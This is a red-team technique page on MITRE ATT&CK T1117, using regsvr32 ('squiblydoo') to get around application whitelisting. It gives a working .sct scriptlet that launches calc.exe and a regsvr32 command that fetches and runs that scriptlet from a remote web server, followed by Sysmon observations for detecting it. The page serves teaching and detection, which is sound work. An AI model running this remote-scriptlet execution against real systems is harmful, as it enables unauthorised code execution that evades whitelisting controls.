---
description: regsvr32 (squiblydoo) code execution - bypass application whitelisting.
---

# T1117: regsvr32

## Execution

{% code-tabs %}
{% code-tabs-item title="back.sct" %}
```markup
<?XML version="1.0"?>
<scriptlet>
<registration
  progid="TESTING"
  classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
  <script language="JScript">
    <![CDATA[
      var foo = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
    ]]>
</script>
</registration>
</scriptlet>
```
{% endcode-tabs-item %}
{% endcode-tabs %}

We need to host the back.sct somehwere on a web server and then we can then execute the above code from the command prompt:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```bash
regsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Observations

![calc.exe spawned by regsvr32.exe](../../.gitbook/assets/regsvr32.png)

Note how regsvr32 process exits almost immediately. This means that just by looking at the list of processes on the victim machine, an evil process may not be immedialy evident... Not until you realise how it was invoked though. Sysmon commandline parameters will show what you need to see:

![](../../.gitbook/assets/regsvr32-commandline.png)

Additionally, sysmon will show regsvr32 establishing a network connection:

![](../../.gitbook/assets/regsvr32-network.png)

{% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1117\",\"type\":\"link\",\"title\":\"Regsvr32 - ATT&CK for Enterprise\",\"icon\":{\"type\":\"icon\",\"url\":\"https://attack.mitre.org/favicon.ico\",\"aspectRatio\":0}}" %}

